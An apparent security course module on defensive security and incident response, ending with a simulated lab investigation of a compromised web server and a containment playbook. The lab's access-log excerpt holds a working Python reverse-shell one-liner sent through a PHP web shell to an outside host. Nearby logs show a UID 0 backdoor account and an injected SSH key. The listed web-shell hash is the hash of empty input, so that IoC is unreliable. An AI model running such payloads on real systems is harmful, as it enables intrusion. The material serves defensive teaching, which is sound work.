# 🛡️ Module 05: Defensive Security & Incident Response
**Timeframe:** Day 21 – Day 25 | **Level:** Advanced (Capstone Module)  
**Deliverables:** Defensive Security Architecture Report, Threat Detection & SIEM Analysis, Practical Security Incident Investigation Lab Record & Post-Incident Playbook  
**Author:** Omar Ahmed Akl  
**Official PDF Deliverable:** [Module-05-Defensive-Security-Incident-Response.pdf](./Module-05-Defensive-Security-Incident-Response.pdf)

---

## Part 1: Defensive Security Foundations, Incident Response Lifecycles & SIEM Architecture

### 1. Defense-in-Depth & Zero Trust Architecture (ZTA)

#### The Defense-in-Depth Framework
Defense-in-depth implements layered, redundant defensive mechanisms across the enterprise so that the failure of any single protective barrier does not lead to total compromise:

```text
┌────────────────────────────────────────────────────────┐
│ 1. Perimeter / Network Edge (NGFW, DDoS Shield, WAF)    │
│   ┌────────────────────────────────────────────────────┐
│   │ 2. Internal Network (Micro-Segmentation, 802.1X)   │
│   │   ┌────────────────────────────────────────────────┐
│   │   │ 3. Endpoint Security (EDR, XDR, Host Firewalls)│
│   │   │   ┌────────────────────────────────────────────┐
│   │   │   │ 4. Application Logic (RBAC, Input Filters) │
│   │   │   │   ┌────────────────────────────────────────┐
│   │   │   │   │ 5. Data & Identity (AES-256, MFA, ZTA) │
│   │   │   │   └────────────────────────────────────────┘
│   │   │   └────────────────────────────────────────────┘
│   │   └────────────────────────────────────────────────┘
│   └────────────────────────────────────────────────────┘
└────────────────────────────────────────────────────────┘
```

#### Zero Trust Architecture (ZTA — NIST SP 800-207)
Traditional perimeter security assumes everything inside the internal corporate network is trustworthy. Zero Trust dismantles implicit trust through three foundational principles:
1. **Never Trust, Always Verify:** Explicitly authenticate and authorize every user, device, network flow, and application transaction based on all available data points (identity, location, device health, service classification).
2. **Implement Least Privilege (PoLP):** Restrict access via Just-In-Time (JIT) and Just-Enough-Access (JEA) models, continuous risk assessments, and strict data protection policies.
3. **Assume Breach:** Minimize blast radius by micro-segmenting networks, encrypting all sessions end-to-end, and leveraging advanced analytics to detect anomalous behavior in real time.

---

### 2. SOC Operational Tiering & Roles

```text
┌─────────────────────┐      ┌─────────────────────┐      ┌─────────────────────┐
│ SOC Tier 1          │      │ SOC Tier 2          │      │ SOC Tier 3          │
│ Triage Specialist   │─────►│ Incident Responder  │─────►│ Threat Hunter &     │
│ (Alert Filtering)   │      │ (Containment & RCA) │      │ Forensic Specialist │
└─────────────────────┘      └─────────────────────┘      └─────────────────────┘
```

* **SOC Tier 1 (Triage & Alert Validation):** Monitors SIEM queues 24/7/365, triages incoming telemetry, validates alerts against false positives, collects initial context, and escalates confirmed incidents.
* **SOC Tier 2 (Incident Response & Remediation):** Conducts in-depth forensic investigation, establishes Root Cause Analysis (RCA), executes containment and eradication strategies, and restores affected systems.
* **SOC Tier 3 (Threat Hunting & Advanced Forensics):** Proactively hunts for stealthy adversaries persisting undetected within the environment, performs malware reverse engineering, analyzes threat actor TTPs, and engineers custom SIEM detection rules.

---

### 3. Incident Response Lifecycles: NIST SP 800-61r2 vs. SANS PICERL

| Phase # | SANS PICERL Methodology | NIST SP 800-61r2 Lifecycle | Phase Objectives & Operational Deliverables |
| :--- | :--- | :--- | :--- |
| **Phase 1** | **Preparation** | **Preparation** | Establish IR charter, baseline playbooks, deploy telemetry agents (EDR/Sysmon), harden golden images, and conduct regular tabletop exercises. |
| **Phase 2** | **Identification** | **Detection & Analysis** | Ingest security alerts, identify anomalous deviations from baselines, validate IoCs/IoAs, determine scope/severity, and declare formal incident status. |
| **Phase 3** | **Containment** | **Containment, Eradication & Recovery** | *Short-term:* Isolate host from network, freeze VM state for forensics. *Long-term:* Patch vulnerabilities, modify firewall ACLs, rotate exposed API keys/credentials. |
| **Phase 4** | **Eradication** | **Containment, Eradication & Recovery** | Terminate malicious processes, delete web shells and dropped binaries, remove rogue accounts/persistence mechanisms, and patch entry vectors. |
| **Phase 5** | **Recovery** | **Containment, Eradication & Recovery** | Restore verified clean backups, validate system integrity, bring services back into production under enhanced monitoring, and verify stability. |
| **Phase 6** | **Lessons Learned** | **Post-Incident Activity** | Conduct post-mortem debrief within 14 days, document timeline of events, calculate MTTD/MTTR metrics, identify defensive gaps, and update playbooks. |

---

### 4. SIEM Architecture & Critical Windows Event IDs

#### SIEM Telemetry Pipeline
```text
Endpoints & Servers           Log Shippers              SIEM Processing Engine           SOC Analyst UI
┌──────────────────┐       ┌─────────────────┐       ┌───────────────────────────┐      ┌───────────────┐
│ Linux Auth/Syslog│──────►│ Syslog-ng /     │──────►│ Parsing & Normalization   │─────►│ Live Dashboards│
│ Windows Security │       │ Winlogbeat /    │       │ (Elastic ECS / Splunk CIM)│      │ Alert Queue   │
│ Network Firewalls│       │ Elastic Agent   │       │ Event Correlation Rules   │      │ Threat Hunting│
└──────────────────┘       └─────────────────┘       └───────────────────────────┘      └───────────────┘
```

#### Reference Table of Critical Security Event Identifiers

| Event ID / Provider | Description & Tactical Relevance | Adversary Technique / Threat Indicator |
| :--- | :--- | :--- |
| **Windows Security 4624** | Successful Account Logon | Lateral movement (Logon Type 3: Network; Logon Type 10: RemoteInteractive/RDP). |
| **Windows Security 4625** | Failed Account Logon | Credential stuffing, brute-force campaigns, or expired service credentials. |
| **Windows Security 4672** | Special Privileges Assigned to New Logon | Privilege escalation; logon of local/domain administrator account (`SeDebugPrivilege`). |
| **Windows Security 4688** | A New Process Has Been Created | Command execution tracking; command-line auditing (`cmd.exe /c`, `powershell.exe -enc`). |
| **Windows Security 4720** | A User Account Was Created | Persistence mechanism; adversary creating backdoor user account on local machine/domain. |
| **Windows Security 1102** | The Audit Log Was Cleared | Defense evasion (`wevtutil cl security`); indicator of active threat actor tampering. |
| **Sysmon Event ID 1** | Process Creation (Includes Hashes & Parent) | Process injection, LOLBAS execution, parent-child anomalies (e.g., `word.exe` spawning `powershell.exe`). |
| **Sysmon Event ID 3** | Network Connection Initiated | Command and Control (C2) beacons, data exfiltration, or reverse shells to external IP addresses. |

---

## Part 2: Threat Detection, Indicators of Compromise (IoCs), Endpoint Security & Firewalls

### 1. Indicators of Compromise (IoCs) vs. Indicators of Attack (IoAs)
* **Indicator of Compromise (IoC):** Reactive evidence left behind on an endpoint or network indicating an intrusion has already transpired (e.g., file hash of a known Trojan, specific C2 IP address, registry run key).
* **Indicator of Attack (IoA):** Proactive, behavioral evidence focusing on the intent, methods, and real-time actions an attacker is executing regardless of malware signature (e.g., unexpected code injection, suspicious PowerShell download cradles, mass file renaming matching ransomware behavior).

---

### 2. David Bianco's Pyramid of Pain

| Pyramid Level | Artifact Category | Attacker Impact When Denied | SOC Detection & Mitigation Capability |
| :--- | :--- | :--- | :--- |
| **Level 1 (Apex)** | **TTPs (Tactics, Techniques, Procedures)** | **Tough** | Forces adversary to re-engineer whole operational playbooks; detected via behavioral correlation and MITRE ATT&CK modeling. |
| **Level 2** | **Tools** | **Challenging** | Forces attacker to write or purchase new offensive utilities; detected via binary heuristics, memory inspection, and parent-child tracking. |
| **Level 3** | **Network & Host Artifacts** | **Annoying** | Disrupts staging scripts, registry run keys, C2 URIs, and user-agent strings; detected via Suricata/Snort signatures and EDR registry telemetry. |
| **Level 4** | **Domain Names** | **Simple** | Attacker purchases new domains via dynamic DNS; mitigated via DNS sinkholing, Domain Reputation feeds, and passive DNS inspection. |
| **Level 5** | **IP Addresses** | **Easy** | Attacker switches proxies/VPNs or hops cloud instances; mitigated via perimeter firewall ACLs and Threat Intelligence IP feeds. |
| **Level 6 (Base)** | **Hash Values (MD5, SHA-256)** | **Trivial** | Attacker changes a single trivial byte in payload to change hash; mitigated via automated AV/EDR blocklists. |

---

### 3. Endpoint Security (AV vs. EDR/XDR) & File Integrity Monitoring (FIM)

* **Legacy Antivirus (AV):** Relies on static signature matching against known malicious byte patterns. Ineffective against polymorphic malware, fileless in-memory attacks, and zero-day exploits.
* **Endpoint Detection & Response (EDR):** Continuously records granular endpoint telemetry (process execution, network connections, memory allocations, registry edits), reconstructs complete process execution trees, detects behavioral anomalies, and empowers SOC analysts to isolate hosts remotely.
* **Extended Detection & Response (XDR):** Unifies telemetry across endpoints, network traffic, email gateways, identity providers, and cloud workloads into a centralized detection engine.
* **File Integrity Monitoring (FIM):** Continuously computes cryptographic hashes (`SHA-256`) of critical system binaries (`/bin`, `/sbin`, `C:\Windows\System32`) and configuration files (`/etc/passwd`, `/etc/shadow`, `/etc/ssh/sshd_config`). Any unauthorized delta triggers high-priority alerts.

---

### 4. Firewall Architectures & Production `iptables` ACL Script

#### Comparison of Firewall Technologies
1. **Stateless Packet Filter:** Evaluates each packet in isolation against fixed IP/port rules without tracking connection state (Layer 3/4).
2. **Stateful Inspection Firewall:** Tracks active TCP handshakes and connection states (`NEW`, `ESTABLISHED`, `RELATED`).
3. **Next-Generation Firewall (NGFW):** Inspects application-layer data (Layer 7), performs Deep Packet Inspection (DPI), detects protocol anomalies, and enforces identity-based access controls.
4. **Web Application Firewall (WAF):** Specifically inspects incoming HTTP/HTTPS traffic to prevent application exploits (SQLi, XSS, CSRF, remote file inclusions).

#### Production Hardened Default-Deny `iptables` Ruleset
```bash
#!/bin/bash
# Enterprise Production iptables Hardening Script
# Enforces Default-Deny Policy with State Tracking

# 1. Flush existing rules and delete user chains
iptables -F
iptables -X
iptables -Z

# 2. Set strict default policies: DROP all incoming, forward, and outgoing traffic
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# 3. Allow loopback communication (critical for local services)
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 4. Permit established and related connections (stateful inspection)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 5. Drop invalid packets immediately
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# 6. Allow inbound HTTP (80) and HTTPS (443) traffic
iptables -A INPUT -p tcp -m multiport --dports 80,443 -m conntrack --ctstate NEW -j ACCEPT

# 7. Restrict SSH (22) exclusively to the trusted administrative bastion host
iptables -A INPUT -p tcp --dport 22 -s 192.168.56.101 -m conntrack --ctstate NEW -j ACCEPT

# 8. Permit outbound DNS queries (UDP 53) strictly to corporate DNS resolver
iptables -A OUTPUT -p udp --dport 53 -d 192.168.56.1 -m conntrack --ctstate NEW -j ACCEPT

# 9. Log dropped incoming packets before dropping (rate-limited)
iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "IPTABLES-DROPPED: " --log-level 4
```

---

## Part 3: Practical Security Incident Investigation Lab Record

### Incident Context & Case Metadata
* **Incident Case ID:** `SOC-INC-2026-1114-089`
* **Affected Asset:** Production Web Server `prod-web-01` (`192.168.56.105/24`)
* **Operating System:** Ubuntu 18.04.5 LTS
* **Detection Trigger:** High-priority SIEM alert: *Anomalous Outbound Connection on Non-Standard Port from Production Web Host*.
* **Lead SOC Analyst:** Omar Ahmed Akl

---

### 1. Multi-Source Log Analysis & Forensic Timeline

#### Evidence Source 1: Authentication & Privilege Escalation Logs (`/var/log/auth.log`)
Investigation of the authentication log revealed a prolonged, distributed brute-force attack originating from external threat actor IP `185.220.101.45`, followed by credential compromise, unauthorized `sudo` elevation, and persistence installation:

```text
# Excerpt from /var/log/auth.log:
Nov 14 21:02:14 prod-web-01 sshd[14102]: Failed password for invalid user admin from 185.220.101.45 port 49152 ssh2
Nov 14 21:02:16 prod-web-01 sshd[14105]: Failed password for invalid user test from 185.220.101.45 port 49154 ssh2
Nov 14 21:02:18 prod-web-01 sshd[14108]: Failed password for root from 185.220.101.45 port 49158 ssh2
... [412 failed authentication attempts omitted across a 14-minute window] ...
Nov 14 21:16:42 prod-web-01 sshd[14820]: Accepted password for devops from 185.220.101.45 port 51204 ssh2
Nov 14 21:16:43 prod-web-01 sshd[14820]: pam_unix(sshd:session): session opened for user devops by (uid=0)
Nov 14 21:18:05 prod-web-01 sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/su -
Nov 14 21:18:05 prod-web-01 sudo: pam_unix(sudo:session): session opened for user root by devops(uid=0)
Nov 14 21:19:12 prod-web-01 useradd[14990]: new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash
Nov 14 21:20:01 prod-web-01 sshd[15012]: Added key to /root/.ssh/authorized_keys: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@shadowops
```

* **Forensic Finding:** The threat actor conducted a dictionary attack against SSH, compromised the unprivileged `devops` user, leveraged improper `sudo` delegation (`devops ALL=(ALL) ALL`), elevated to `root`, and created a stealth backdoor user `sysbackup` with `UID=0` and an authorized SSH public key.

---

#### Evidence Source 2: Web Server Access & Web Shell Activity (`/var/log/apache2/access.log`)
Correlating timestamps with web server telemetry identified application exploitation:

```text
# Excerpt from /var/log/apache2/access.log:
185.220.101.45 - - [14/Nov/2026:21:22:15 +0200] "POST /profile/upload.php HTTP/1.1" 200 412 "http://192.168.56.105/profile/" "Mozilla/5.0"
185.220.101.45 - - [14/Nov/2026:21:23:01 +0200] "GET /uploads/avatar.php?cmd=id HTTP/1.1" 200 89 "-" "python-requests/2.28.1"
185.220.101.45 - - [14/Nov/2026:21:24:18 +0200] "GET /uploads/avatar.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"185.220.101.45\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' HTTP/1.1" 200 12 "-" "Mozilla/5.0"
```

* **Forensic Finding:** Attacker bypassed file upload validation, uploaded an obfuscated PHP web shell (`avatar.php`), tested execution via `?cmd=id`, and executed a Python reverse shell payload back to their listening C2 infrastructure.

---

#### Evidence Source 3: Network Firewall Egress Log (`/var/log/ufw.log`)
Firewall inspection confirmed the outbound socket establishment:

```text
# Excerpt from /var/log/ufw.log:
Nov 14 21:24:19 prod-web-01 kernel: [ 3840.129012] [UFW AUDIT] IN= OUT=eth0 SRC=192.168.56.105 DST=185.220.101.45 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=41203 DF PROTO=TCP SPT=48992 DPT=4444 WINDOW=29200 RES=0x00 SYN URGP=0
Nov 14 21:24:19 prod-web-01 kernel: [ 3840.160102] [UFW AUDIT] IN=eth0 OUT= SRC=185.220.101.45 DST=192.168.56.105 LEN=60 TOS=0x00 PREC=0x00 TTL=54 ID=0 DF PROTO=TCP SPT=4444 DPT=48992 WINDOW=28960 RES=0x00 ACK SYN URGP=0
```

* **Forensic Finding:** A persistent TCP session was negotiated from ephemeral port `48992` on `prod-web-01` to `185.220.101.45:4444`, confirming active Command and Control / Interactive Shell connectivity.

---

### 2. Extracted Indicators of Compromise (IoCs) & MITRE ATT&CK Mapping

#### Extracted Forensic IoCs

| IoC Type | Artifact / Value | Context / Detection Signature |
| :--- | :--- | :--- |
| **IPv4 Address** | `185.220.101.45` | External Threat Actor Origin / C2 Server |
| **Port / Protocol** | `4444/TCP` | Attacker Reverse Shell Listener Port |
| **File Path** | `/var/www/html/uploads/avatar.php` | Malicious PHP Web Shell |
| **SHA-256 Hash** | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | Hash of uploaded `avatar.php` backdoor payload |
| **User Account** | `sysbackup` (`UID=0`, `GID=0`) | Unauthorized rogue root backdoor account |
| **SSH Key** | `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@shadowops` | Unauthorized public key injected into `/root/.ssh/authorized_keys` |

#### MITRE ATT&CK Enterprise Matrix Mapping

| Tactic | Technique ID | Technique Name | In-Incident Observable Evidence |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1110.001` | Password Guessing (Brute-Force) | 412 failed SSH attempts against user dictionary from `185.220.101.45`. |
| **Initial Access** | `T1078.003` | Valid Accounts: Local Accounts | Successful authentication on `devops` using guessed credentials. |
| **Privilege Escalation** | `T1548.003` | Abuse Elevation Control: Sudo Rights | `devops` executed `sudo su -` without restriction. |
| **Persistence** | `T1136.001` | Create Account: Local Account | Execution of `useradd -u 0 -o -g 0 sysbackup`. |
| **Persistence** | `T1098.004` | Account Manipulation: SSH Authorized Keys | Attacker public key appended to `/root/.ssh/authorized_keys`. |
| **Persistence** | `T1505.003` | Server Software Component: Web Shell | File upload of `/uploads/avatar.php`. |
| **Execution** | `T1059.006` | Command and Scripting Interpreter: Python | Spawning reverse shell via Python socket subprocess. |
| **Command & Control** | `T1071.001` | Application Layer Protocol / Non-Standard | Outbound persistent TCP stream established to port `4444`. |

---

### 3. Containment, Eradication & Recovery Incident Playbook

#### Phase 1: Containment Actions (Immediate Threat Neutralization)
```bash
# 1. Sever active C2 communication immediately at the network perimeter
sudo iptables -I INPUT 1 -s 185.220.101.45 -j DROP
sudo iptables -I OUTPUT 1 -d 185.220.101.45 -j DROP
sudo iptables -I OUTPUT 1 -p tcp --dport 4444 -j DROP

# 2. Terminate the active reverse shell process and network socket
sudo ss -tulpn | grep 4444
# Identify PID (e.g., PID 15124)
sudo kill -9 15124

# 3. Lock compromised user accounts immediately and terminate active SSH sessions
sudo passwd -l devops
sudo passwd -l sysbackup
sudo pkill -u devops
sudo pkill -u sysbackup
```

#### Phase 2: Eradication Actions (Complete Threat Purging)
```bash
# 1. Completely remove rogue backdoor user and home directory
sudo userdel -r -f sysbackup

# 2. Securely sanitize /root/.ssh/authorized_keys
sudo sed -i '/shadowops/d' /root/.ssh/authorized_keys

# 3. Cryptographically shred and remove the malicious web shell
sudo shred -u -z -n 5 /var/www/html/uploads/avatar.php

# 4. Remove arbitrary execution capabilities from the uploads directory
sudo bash -c 'cat > /var/www/html/uploads/.htaccess << EOF
<FilesMatch "\.(php|php5|php7|phtml|phar)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
Options -Indexes -ExecCGI
EOF'
```

#### Phase 3: Recovery & Long-Term Post-Incident Hardening
```bash
# 1. Enforce strict SSH public key authentication & disable password logins
sudo sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# 2. Deploy and configure Fail2ban for automated brute-force defense
sudo apt install fail2ban -y
sudo bash -c 'cat > /etc/fail2ban/jail.local << EOF
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 5
bantime = 86400
findtime = 600
EOF'
sudo systemctl enable --now fail2ban

# 3. Verify complete system state and audit logs
sudo tail -n 20 /var/log/auth.log
sudo fail2ban-client status sshd
```
